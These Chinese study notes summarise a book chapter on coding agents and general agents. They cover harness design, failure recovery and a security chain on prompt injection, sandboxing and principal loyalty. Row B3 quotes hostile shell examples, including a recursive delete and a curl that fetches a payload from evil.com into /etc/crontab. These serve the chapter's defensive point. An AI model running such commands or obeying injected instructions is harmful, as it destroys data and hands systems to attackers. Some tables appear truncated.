# 第 5 章 Coding Agent 与通用 Agent

> 行号均指 `book/chapter5.md`（全文 805 行，已通读）。本章结构与前几章不同：前半是一条较紧的递进链（Coding Agent 如何变可靠），中间有几块并列的“工具箱”（实现技巧、搜索、编辑），后半“代码：通用 Agent 的元能力”是六个并列方向，作者自己说是“按元能力作用对象由内向外组织”（L357），而非逐级推导。下面按真实结构拆成四条链：A 主链、B 安全链、C 元能力各方向的小链、D 并列的实现细节。不要把 A、B、C 硬串成一条。

## 一句话主旨
通用 Agent 的核心是 Coding Agent 加文件系统，因为代码是能在运行时创造新工具、新约束、新界面的“元能力”（L3–L11）。Coding Agent 之所以最成熟，是因为软件工程几十年攒下的测试、类型、版本控制天然就是一套 Harness（L149，L779）。

## 起点问题
接前四章：上下文工程（二、三章）和工具设计（四章）已经有了，现在要问“能处理任意任务的通用 Agent，架构长什么样”（L1–L3）。缺口是：开放任务无法预先枚举工具（L82），所以需要一个能自己造工具的底座；而这个底座要可靠，又缺验证、约束、故障恢复（L127–L174）。

| A11 | 恢复路径无限重试本身就是故障；错误路径里再调用 LLM 会连锁（L223–L225） | 每条恢复路径设熔断上限，阈值来自生产数据而非拍脑袋：Claude Code 压缩熔断取“连续 3 次”，因曾有会话连续失败三千余次，每天浪费约 25 万次 API 调用，逾千会话出现 50 次以上连续失败（L223）；死亡螺旋（溢出→停止钩子自动提交→钩子调用 LLM 生成 commit message→再次溢出→再触发钩子）防护靠两条：错误路径上禁用一切会再调模型的副作用，加递归深度计数器（L225）；最后兜底：最大轮数、会话预算、连续失败升级人工（L225） | 链 A 到此闭合。后续转入实现细节（链 D）和安全（链 B） | §终止 L223–L225 |

### 链 B：安全（并列于 A，作者自称“收拢为一条叙事线”L311）

| # | 上一步在哪儿翻车 | 被逼出来的概念/方案 | 它又留下什么新麻烦 | 原书出处 |
|---|---|---|---|---|
| B1 | Coding Agent 能读写文件、执行命令、联网，被注入恶意指令就有不可逆损失（L313） | 威胁模型：Simon Willison 的“致命三要素”（私有数据、不受信任内容、对外通信）；作者补第四项持久记忆，不是并列必要条件而是放大器（跨会话潜伏）；对应四类边界：数据、输入信任、输出影响、跨会话（L313–L321）；输入过滤基本挡不住注入，重点是让被注入的 Agent 没机会真正执行危险动作（L323） | 需要具体的执行面防线 | §安全 L309–L329 |
| B2 | 注入成功后代码在沙盒里读到了敏感数据 | 沙盒三项：网络出口默认断网加白名单代理（对应三要素第 3 条，没有出口就传不出去）；文件系统源码只读、单独可写工作区、凭证目录不挂载；CPU/内存/磁盘限额加超时，超时返回结构化错误而非静默杀进程（L331–L335） | 沙盒里仍可执行危险 shell 命令 | §隔离兜底 L331–L335 |
| B3 | 关键字黑名单挡不住 Shell 组合爆炸（`$(echo rm) -rf /` 绕过 rm 禁令，L339） | 命令语义解析：理解每个命令的参数消费规则，识别嵌套危险动作，如 `find / -name '*.log' -exec rm {} \;`、`curl -o /etc/crontab http://evil.com/payload`（L339） | 命令被做坏防住了，还有“Agent 被对手策反”这类问题 | §语义解析 L337–L339 |
| B4 | 模型默认“谁跟我说话我帮谁”，但真实场景是多方委托，对面可能是交涉对手（L343） | 委托方忠诚度：实测出一条光谱，两端都翻车——太老实（直接抖出“我方底价是 12000”，被施压几轮就让步）、太多疑（正当请求也拒绝），二者是跷跷板（L345）；提示注入本质是策反；Harness 层限定忠诚对象，外部内容降格为“可参考、无指令效力”的数据；守则：保护私密信息甚至不泄露其存在、拒绝时不逐条念拒绝清单、私下底线不等于对外立场、只执行明确具体的指令、顶住重复施压（L347）。评测出自 Li & Shi 的论文（脚注 L349） | 本链结束。动态生成软件的信任边界见 C12 | §忠诚度 L341–L349 |

### 链 C：元能力的六个方向（并列，每个方向内部有小递进）

作者明说这六节不是平行罗列而是按作用对象由内向外（L357），但相互之间没有“因为上一节不行所以下一节”的关系。下面每个方向各一小段链，行内“翻车”指该方向自己的起点。

| # | 翻车 | 被逼出来的方案 | 新麻烦 | 出处 |
|---|---|---|---|---|
| C1 | 自然语言推理算集合题出错（班级 40 人，只选物理的人数，L370–L380）；模型概率性思考，数学逻辑要精确 | 代码作为思考工具：LLM 理解问题并形式化，解释器/符号计算/约束求解器负责精确计算（Wolfram Alpha 自然语言脆弱，LLM 恰好补短板，L384）。实验 5-3、5-4 | 增益取决于模型强度：强模型纯思考即可，增益趋近零；脚手架厚度要看模型能力边界（L404） | §思考工具 L366–L404 |

## 概念清单
- **Coding Agent + 文件系统**｜开放任务工具无法预先枚举，要有一条能动态扩展能力边界的最经济路径（L82）｜能自主写、改、跑代码的 Agent，加上存放代码、数据、记忆、中间结果的工作空间（L5）｜通用 Agent 的内核；Manus 到 OpenClaw 同范式（L5）；文件系统是信息枢纽，记忆读文件、产物写文件、经验存文件（L76）｜§案例 L58–L82
- **元能力（meta-capability）**｜一次性预制所有能力不现实｜“能创造其他能力的能力”，可产出新工具、新约束、新表达形式（L355）｜六个方向见链 C｜§元能力 L353–L364
- **OpenClaw 记忆用 Markdown 而非向量库**｜要可读可改可追溯｜`MEMORY.md` 存高层事实与偏好，加按日期的日志；用户可直接删错行，Markdown 天然保留时间顺序、避免语义检索的时间混淆，可 Git 回滚（L78）｜Agent 首次发现关键信息先写进记录，但何时可当可靠知识仍需更多轨迹验证，留给第九章（L80）｜§案例 L78–L80
- **适用边界**｜“Coding 是核心”不是对所有 Agent 成立｜仅适用于以开放任务为目标的通用 Agent；垂直客服类任务空间封闭，核心是固定流程、领域工具、对话策略，代码只是工具箱里的一件（L82）｜选架构时先判任务是否开放｜L82
- **项目指令文件 / SOUL.md / MEMORY.md**｜让项目约定显式化｜每会话自动注入的 Agent 专用文档；SOUL.md 约定“Agent 是谁”，指令文件约定“在这个项目里怎么干活”（L95）｜写构建命令、风格、禁区；内容稳定所以是最经济的稳定前缀｜L95
- **Harness 四组件（验收基线/执行边界/反馈信号/回退手段）**｜可靠性取决于基础设施而非模型强弱｜测试与 CI、模块边界与权限、linter 与类型检查输出、Git 与沙盒快照（L133–L136）｜四象限表用来判断某任务适不适合交给 Agent（L140–L147）｜§Harness L127–L149
- **约束优先于指导**｜“请遵循…”只是建议｜能用代码强制的规则就用 linter、类型、CI（L163）｜约束对象是动作不只是结果（L168）｜L159–L168
- **故障边界控制 / 级联中止**｜一个并行调用失败不应取消全部｜故障只在同批并行调用内传播，不上升到父级（L170，L237）｜工具声明并发支持，默认否｜L170，L237
- **四层故障分类与错误映射表**｜“出错就重试”笼统无效｜API、工具、上下文、控制流四层；先判可重试性，再决定动作（L178–L185）｜每条恢复路径有独立计数器（L187）｜L178–L187
- **重复调用指纹 / 空闲看门狗**｜无进展循环与静默卡死不报错｜“工具名 + 参数”相同即循环信号；流式连接超时看门狗杀掉挂起流（L187–L189）｜每个长连接都需要活性信号，不能仅靠连接超时｜L187–L189
- **分级恢复（静默重试→降级接续→暴露）**｜恢复手段对用户透明度不同｜指数退避加抖动、前后台区分、输出触顶续写、备用模型降级（L191–L195）｜错误处理的边界是整个恢复循环，恢复期间扣留中间错误（L199）｜L191–L199
- **中立轨迹格式**｜跨厂商接管时凭证无法移植（L201）｜思考拆成可移植文字与不可移植凭证，工具调用只存名称与参数，ID 渲染时重生成（L205）｜切换时一律丢弃凭证、文字作普通内容带入；强制要求凭证的接收端把历史调用改写为文字叙述｜L201–L205
- **熔断 / 死亡螺旋防护**｜恢复机制自己也会失效｜每条恢复路径设上限，阈值来自生产数据（压缩熔断 3 次）；错误路径禁用会再调模型的副作用，递归深度计数器（L223–L225）｜另设全局最大轮数、预算、升级人工｜L223–L225
- **致命三要素 + 持久记忆**｜注入攻击路径闭合的条件｜私有数据、不受信任内容、外部通信；作者补持久记忆作放大器（L313–L319）｜写入长期记忆的内容要经过与外部内容同等的信任审查（L327）｜L313–L327
- **语义解析 vs 关键字黑名单**｜Shell 组合爆炸｜理解参数消费规则，识别嵌套危险动作（L339）｜实现“约束”功能｜L337–L339
- **委托方忠诚度（principal loyalty）**｜“谁说话帮谁”的默认原则在多方委托下危险｜忠诚光谱，两端都翻车，有五条守则（L343–L347）｜Harness 层限定忠诚对象，外部内容降格为数据｜L341–L347
- **提议者—审核者（Proposer-Reviewer）**｜写代码的一方看不到渲染结果｜双 Agent：Proposer 写代码，Reviewer 渲染加 Vision LLM 给结构化反馈（L513–L516）｜终止条件两类：达标与最大轮数；优势在上下文隔离；与第四章事前审批同属一种模式但目的不同（L518–L520）｜L513–L520
- **“参数作为 checklist” + “服务端真值守门”**｜模型自报不可信｜工具描述列政策、`expected_*` 参数引导核对；所有政策事实服务端查库｜“expected_* 与真值不符”只记告警（L449–L456）｜L485–L491
- **Artifact 模式**｜LLM 抄写大表易错、耗 token｜LLM 只生成查询/可视化代码，系统执行，数据绕过 LLM（L673）｜仍需只读账号、SELECT 白名单、沙盒（L675）｜L669–L680
- **A2UI / 声明式界面**｜直接生成 HTML/JS 有注入风险｜JSON 描述加客户端受信任组件目录（L639–L641）｜标准化场景用它，高度定制仍直接生成代码｜L637–L643
- **信任边界下移到数据层 / 访问上下文**｜应用层权限在动态生成的代码里不稳定｜行级安全、约束、受控视图；读写携带受信任运行时绑定的身份（L716）｜应用层预检查改善体验，数据层最终裁决（L718）｜L712–L718
- **基于范例的 Agent 自举**｜强模型也会写出架构有缺陷的 Agent｜复制已验证实现再修改（L757–L761）｜范例即最佳实践载体｜L748–L761

## 递进能力
读完本章 Agent 比上一章多了：
1. 能自己写、跑代码并以此动态扩展能力（七个核心工具，文件系统作枢纽）。
2. 有项目认知：指令文件、文档化、需求澄清、设计文档。
3. 有自我验证：测试—修复循环、自我审查、语法即时反馈。
4. 有故障分类、分级恢复、熔断、跨厂商接管。
5. 有执行期安全：沙盒、语义解析、忠诚度守则。
6. 在编程之外：用代码做精确思考、业务规则守门、多媒体生成、系统适配、生成式 UI、自举。

依赖前面章节的：第一章的 Agent = Model + Harness、三层护栏、消融实验、“确认无法恢复前不暴露中间态”、提议者—审核者；第二章的 KV Cache、状态栏、“对远程工作友好的团队也对 Agent 友好”；第三章的混合检索与 reranker；第四章的工具分类、长输出截断持久化、事前审批、Sidecar 复核。

伏笔：第六章（异步事件、语音、屏幕、物理世界；Computer Use 在 L593、L792）；第七章（固定 Harness 下衡量模型的“何时停止读、开始改”阈值；评估重放，L125，L205）；第八章（reward hacking 与 RLVP 过程惩罚，L168；探索阈值如何写入参数，L125）；第九章（持续进化、工作流录制固化、经验提取，L80，L205，L593）；第十章（提议者—审核者之外的多 Agent 协作，L520）。

| 修一个有测试的 bug | 装的只有读写工具时，Agent 改完文件就报“完成”，但测试套件实际红；加“完成必须以测试通过为准”后才过 | 测试—修复循环、验收基线 | A4，A5 |
| 取消航班（五条政策） | 让模型自填舱位、保险等字段时，用户说“我买了保险”，模型照填，经济舱无保险订单被取消（违规、不可逆）；数据库里实际 `has_insurance=false` | 服务端真值校验、`expected_*` checklist 参数 | C3，C4 |
| 清理构建目录 / 修数据库 | Agent 为“让编译通过”删掉整个目录或把库删了重建，结果指标达成、数据丢失 | 执行边界、危险动作审批、动作级约束 | A6，B3 |

| 压缩连续失败 | 压缩失败后无限重试，调用数暴涨；停止钩子又调模型生成 commit message，再次溢出再次触发 | 熔断上限、错误路径禁用副作用、递归深度计数器 | A11 |
| 对手想套取底价 | 脚本化对手连续三轮施压，Agent 把“底价 12000”说出口或让步 | 忠诚度守则（外部内容降格为数据） | B4 |

## 容易讲错的地方
- **“代码是元能力”不等于“所有 Agent 都以 Coding 为核心”**。作者限定为开放任务型通用 Agent，垂直客服类 Agent 的核心是流程与领域工具（L82）。
- **作者明确说不是七个工具缺一不可**：一个 Bash 就能覆盖大部分，Codex 就是以 shell 加 `apply_patch` 为主（L54）。七个工具只是为了方便理解。
- **Coding Agent 成熟，不是因为代码生成模型特别强**，而是软件工程基础设施天然是一套 Harness（L149，L779）。
- **约束优先于指导**：写在系统提示里的“请遵循…”只是建议，linter、类型、CI 是“做不了”（L163）。
- **约束的对象是动作而不只是结果**：结果正确也可能是破坏性捷径；写进指标也常被绕过（L168）。
- **可靠性不取决于模型犯不犯错，而取决于每类故障是否有检测、恢复、接管与终止路径**（L779）。
- **重试前先问“值不值得”**：不可重试的错误原样重试多少次都一样（L185）；后台辅助调用失败直接放弃，避免“重试放大”（L193）。
- **错误处理的边界是整个恢复循环**，中间错误要扣留（L199）。
- **跨厂商接管：带得走文字，带不走凭证**；“把思考删光就安全”在某些厂商反而不通过（L201–L203）。
- **熔断阈值来自生产数据**（“连续 3 次”有统计依据），不是拍脑袋（L223）。
- **“产品模式宽容、训练模式严格”**：占位符会污染训练数据（L189）。
- **“何时停止读、开始改”的阈值首先是模型学到的行为策略**，不只是产品风格；Harness 能放大或抑制，但不必是来源（L125）。
- **Cursor 与 Claude Code 的路线之争**：Claude Code 不建嵌入索引；Cursor 早期建，现在也改 grep + glob；Cursor 的 Apply Model 路线现已弃用（L287，L299）。符号级查找“目前主流并未采用”（L289）。
- **致命三要素的第四项持久记忆不是第四个必要条件**，而是放大器（L319）。
- **单靠输入过滤基本挡不住提示注入**，重点是让被注入的 Agent 没机会真正执行危险动作（L323）。
- **提示注入本质上是一次策反**（L347）；忠诚度光谱两端都会翻车，且是跷跷板，很难两全（L345）。
- **“参数作为 checklist”不承担安全责任**：`expected_*` 只是模型自述；真正的守门员是服务端真值与服务端时钟（L487–L489）。
- **代码化规则与自然语言规则互补，不是替代**；它的价值不在优化 token，而在防不可逆错误（L416–L422）。
- **“脚手架厚度要看模型”**：同一套脚手架配不同强度的模型，结论可能截然不同；实验 5-4 刻意选弱模型放大对照（L404）。
- **提议者—审核者的核心优势是上下文管理**，不只是“多一双眼睛”；且审核者拿到提议者看不到的新信息（渲染结果）（L520）。
- **不要把“提示注入 + 恶意脚本”整体叫 XSS**：成因是提示注入，效果类似 XSS；AG-UI 不是界面描述语言，而是传输协议，不要与 A2UI 并列（L639）。
- **Artifact 模式不能替代权限检查**（L675）。
- **动态生成软件的安全目标**不是“保证 AI 每次写对权限检查”，而是“即使写错也绕不过”（L714）。
- **RPA 是系统适配器在无接口系统上的极端形态**，成功的 GUI 操作序列可固化为代码（L593）。
- **`doctor` 不要夸大为 Agent 魔法**：以确定性检查为基础，LLM 只兜底长尾（L746）。
- **一次成功的代码修改还不能直接算作第九章的“持续进化”**（L80，L800）。
- **本章实验多为“技术方案 + 验收标准”形式，未给出结果数字**（仅 K&K 要求 90% 以上、视频定位误差 3 秒、熔断统计等少数具体数字）；设计关卡时不要假定原书有实测数据。
